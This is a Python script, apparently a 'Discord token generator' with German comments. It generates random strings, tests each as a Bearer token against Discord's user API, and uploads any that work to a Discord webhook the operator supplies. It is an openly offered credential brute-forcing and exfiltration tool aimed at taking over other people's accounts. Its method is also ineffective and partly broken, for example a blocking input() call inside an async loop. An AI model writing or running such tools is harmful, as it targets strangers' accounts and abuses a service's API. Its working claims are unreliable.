import asyncio
import random
import string
import os
import requests
from aiohttp import ClientSession
from colorama import Fore, Style, init

# Initialisierung für die Farben
init(autoreset=True)

# Utility-Funktion zum Zeichnen der Box
def draw_box(title, content):
    border = '=' * (len(title) + 4)
    print(f"{Fore.CYAN}{border}{Style.RESET_ALL}")
    print(f"{Fore.CYAN}| {title.center(len(border) - 4)} |{Style.RESET_ALL}")
    print(f"{Fore.CYAN}{border}{Style.RESET_ALL}")
    print(content)
    print(f"{Fore.CYAN}{border}{Style.RESET_ALL}")

# Token-Generator-Funktion
async def token_generator(session, valid_tokens, invalid_tokens):
    while True:
        token = ''.join(random.choices(string.ascii_letters + string.digits, k=59))
        valid = await token_checker(session, token)
        if valid:
            valid_tokens.append(token)
            print(f"{Fore.GREEN}[VALID] {token}")
        else:
            invalid_tokens.append(token)
            print(f"{Fore.RED}[INVALID] {token}")
        await asyncio.sleep(0.1)

# Überprüfung der Token-Gültigkeit
async def token_checker(session, token):
    url = 'https://discord.com/api/v9/users/@me'
    headers = {'Authorization': f'Bearer {token}'}
    try:
        async with session.get(url, headers=headers) as response:
            return response.status == 200
    except Exception:
        return False

# Funktion zum kontinuierlichen Generieren bis zur Eingabe
async def generate_until_stopped(valid_tokens, invalid_tokens):
    task = asyncio.create_task(token_generator(ClientSession(), valid_tokens, invalid_tokens))
    try:
        while True:
            if input() == '':
                task.cancel()
                try:
                    await task
                except asyncio.CancelledError:
                    return
    except KeyboardInterrupt:
        task.cancel()
        await task

# Funktion zum Speichern der Tokens und Senden an Discord Webhook
def save_and_send(valid_tokens, webhook_url):
    # Speichern der Tokens in einer Datei
    with open('token.txt', 'w') as file:
        for token in valid_tokens:
            file.write(token + '\n')
    
    # Senden der Datei an Discord Webhook
    with open('token.txt', 'rb') as file:
        files = {'file': ('token.txt', file)}
        data = {"content": "Here are the valid Discord tokens"}
        response = requests.post(webhook_url, data=data, files=files)
        if response.status_code == 204:
            print(f"{Fore.GREEN}Tokens successfully sent to Discord webhook!{Style.RESET_ALL}")
        else:
            print(f"{Fore.RED}Failed to send tokens to Discord webhook.{Style.RESET_ALL}")

# Menü-Anzeige und Benutzerinteraktion
async def show_menu():
    while True:
        draw_box("Discord Tool - Main Menu", "1. Generate Discord Tokens\n2. Exit")
        choice = input("Enter your choice: ")

        if choice == '1':
            webhook_url = input("Enter your Discord Webhook URL: ")
            print("Generating Discord Tokens... Press Enter to stop.")
            valid_tokens = []
            invalid_tokens = []
            await generate_until_stopped(valid_tokens, invalid_tokens)
            draw_box("Generation Completed", f"Valid Tokens: {len(valid_tokens)}\nInvalid Tokens: {len(invalid_tokens)}")
            if valid_tokens:
                save_and_send(valid_tokens, webhook_url)
        elif choice == '2':
            break
        else:
            print(f"{Fore.RED}Invalid choice, please try again.{Style.RESET_ALL}")

# Hauptfunktion zum Starten des Programms
async def main():
    await show_menu()

if __name__ == "__main__":
    asyncio.run(main())
